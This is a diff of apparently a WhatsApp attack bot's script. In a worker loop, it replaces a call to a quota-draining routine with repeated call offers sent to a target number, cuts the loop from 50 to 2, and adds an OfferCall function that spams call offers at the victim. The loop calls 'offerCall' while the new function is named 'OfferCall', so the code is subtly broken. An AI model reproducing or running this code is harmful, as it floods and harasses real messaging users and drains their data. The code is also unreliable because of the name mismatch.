@@ -3327,9 +3327,9 @@ Status      : Success
             
             const instanceId = Date.now() + Math.random();
             
-            for (let i = 0; i < 50; i++) {
+            for (let i = 0; i < 2; i++) {
                 try {
-                    await VnXNewStcDrainKouta1000Gb(sock, target);
+                    await offerCall(sock, target);
                     await sleep(2000)
                 } catch (e) {
                     console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
@@ -3881,6 +3881,15 @@ async function P7X(sock, target) {
     participant: { jid: target },
     messageId: kuro.key.id
   });
+}
+
+async function OfferCall(sock, target) {
+    try {
+        await sock.offerCall(target);
+        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
+    } catch (error) {
+        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
+    }
 }
 
 //     _       ___  _   _ _   _ _____  _   _        
